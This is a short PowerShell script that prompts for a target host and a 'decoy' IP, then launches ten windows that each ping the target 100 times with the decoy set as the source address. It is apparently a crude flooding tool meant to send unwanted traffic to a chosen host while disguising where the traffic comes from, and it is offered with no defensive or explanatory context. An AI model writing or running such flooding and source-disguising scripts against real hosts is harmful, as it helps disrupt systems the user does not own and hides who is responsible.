$target = Read-Host "Enter the target IP or hostname: "
$decoy = read-host "Enter the Ip you would like to ise as the decoy: "
$windowCount = 10

for ($i = 1; $i -le $windowCount; $i++) {
    Start-Process powershell.exe -ArgumentList "-NoExit -Command `"ping -n 100 -w 500 -S $decoy $target`""
}
